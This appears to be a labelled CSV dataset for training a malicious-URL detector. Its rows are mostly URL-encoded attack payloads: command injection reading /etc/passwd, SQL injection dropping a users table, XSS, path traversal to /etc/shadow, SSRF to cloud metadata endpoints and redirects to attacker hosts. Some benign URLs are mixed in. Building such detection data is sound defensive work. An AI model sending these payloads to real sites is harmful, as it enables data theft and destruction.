url,label
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/redirect?url=http%3A//malicious.com,open_redirect
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/login?username=%27%3B%20DROP%20TABLE%20users%3B%20--,sqli
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
https://news.com/article?id=1234,benign
http://site.com/fetch?url=http%3A//localhost/admin,ssrf
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
https://news.com/article?id=1234,benign
http://site.com/login?username=%27%3B%20DROP%20TABLE%20users%3B%20--,sqli
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/redirect?url=https%3A//attacker.com/evil,open_redirect
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/login?username=%27%3B%20DROP%20TABLE%20users%3B%20--,sqli
http://site.com/view?file=../config.php,lfi
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/redirect?url=https%3A//attacker.com/evil,open_redirect
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/view?file=../etc/shadow,lfi
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/execute?cmd=%7C%20whoami,cmdi
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/execute?cmd=%3Bls,cmdi
http://example.com/home,benign
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/view?file=../../etc/passwd,lfi
https://news.com/article?id=1234,benign
http://site.com/fetch?url=http%3A//localhost/admin,ssrf
https://weather.com/today?location=delhi,benign
http://site.com/fetch?url=http%3A//localhost/admin,ssrf
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
https://shop.com/products?category=books,benign
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/login?username=%27%20OR%201%3D1%20--,sqli
http://site.com/view?file=../config.php,lfi
https://news.com/article?id=1234,benign
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/view?file=../config.php,lfi
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/redirect?url=http%3A//malicious.com,open_redirect
http://site.com/execute?cmd=%3Bls,cmdi
https://news.com/article?id=1234,benign
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/view?file=../etc/shadow,lfi
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/view?file=../config.php,lfi
http://docs.com/download?file=report.pdf,benign
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://docs.com/download?file=report.pdf,benign
http://docs.com/download?file=report.pdf,benign
https://shop.com/products?category=books,benign
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/login?username=%27%3B%20DROP%20TABLE%20users%3B%20--,sqli
http://site.com/fetch?url=http%3A//localhost/admin,ssrf
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/login?username=admin%27%20--,sqli
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
https://weather.com/today?location=delhi,benign
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://docs.com/download?file=report.pdf,benign
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/search?q=%3Cscript%3Ealert%281%29%3C/script%3E,xss
https://weather.com/today?location=delhi,benign
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://site.com/search?q=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,xss
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://example.com/home,benign
http://site.com/view?file=../config.php,lfi
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/view?file=../etc/shadow,lfi
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/fetch?url=http%3A//169.254.169.254/latest/meta-data/,ssrf
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://site.com/search?q=%22%20onmouseover%3Dalert%281%29%20%22,xss
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
https://weather.com/today?location=delhi,benign
http://site.com/fetch?url=http%3A//localhost/admin,ssrf
http://site.com/search?q=%22%20onmouseover%3Dalert%281%29%20%22,xss
http://site.com/search?q=%3Cscript%3Ealert%281%29%3C/script%3E,xss
http://site.com/login?username=%27%3B%20DROP%20TABLE%20users%3B%20--,sqli
http://site.com/search?q=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,xss
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/search?q=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,xss
http://site.com/redirect?url=https%3A//attacker.com/evil,open_redirect
http://site.com/view?file=../etc/shadow,lfi
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
https://news.com/article?id=1234,benign
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/login?username=admin%27%20--,sqli
http://site.com/fetch?url=http%3A//internal.site.local,ssrf
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/login?username=%27%20OR%201%3D1%20--,sqli
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/search?q=%3Cscript%3Ealert%281%29%3C/script%3E,xss
https://shop.com/products?category=books,benign
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://site.com/execute?cmd=%7C%20whoami,cmdi
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/redirect?url=https%3A//attacker.com/evil,open_redirect
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/search?q=%3Cscript%3Ealert%281%29%3C/script%3E,xss
http://site.com/redirect?url=http%3A//malicious.com,open_redirect
http://docs.com/download?file=report.pdf,benign
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/login?username=admin%27%20--,sqli
http://docs.com/download?file=report.pdf,benign
https://weather.com/today?location=delhi,benign
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
https://shop.com/products?category=books,benign
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/fetch?url=http%3A//127.0.0.1%3A80/,ssrf
http://site.com/search?q=%3Cbody%20onload%3Dalert%28%27xss%27%29%3E,xss
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/fetch?url=http%3A//metadata.google.internal,ssrf
http://site.com/view?file=../../../../boot.ini,lfi
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://site.com/redirect?url=http%3A//malicious.com,open_redirect
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
http://site.com/login?username=admin%27%20--,sqli
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/login?username=%27%20OR%201%3D1%23,sqli
http://site.com/redirect?url=http%3A//phishing.site/login,open_redirect
http://site.com/execute?cmd=%3Bls,cmdi
http://site.com/execute?cmd=%3B%20ping%20-c%204%20127.0.0.1,cmdi
http://site.com/redirect?url=//evil.com,open_redirect
http://site.com/redirect?url=http%3A//malicious.com,open_redirect
https://shop.com/products?category=books,benign
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://docs.com/download?file=report.pdf,benign
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/redirect?url=/%5Cevil.com,open_redirect
http://site.com/search?q=%3Csvg%20onload%3Dalert%281%29%3E,xss
http://site.com/execute?cmd=%60cat%20/etc/passwd%60,cmdi
http://site.com/redirect?url=https%3A//attacker.com/evil,open_redirect
http://site.com/view?file=../../etc/passwd,lfi
http://site.com/execute?cmd=%26%20netstat%20-an,cmdi
http://site.com/login?username=%27%20OR%20%271%27%3D%271,sqli
http://example.com/home,benign
http://site.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27x%27%29%3E,xss
http://site.com/search?q=%22%20onmouseover%3Dalert%281%29%20%22,xss
http://site.com/login?username=%27%20OR%201%3D1%20--,sqli
http://site.com/view?file=../../../../../windows/system32,lfi
http://site.com/execute?cmd=%7C%20whoami,cmdi
http://site.com/login?username=%27%20OR%201%3D1%20--,sqli
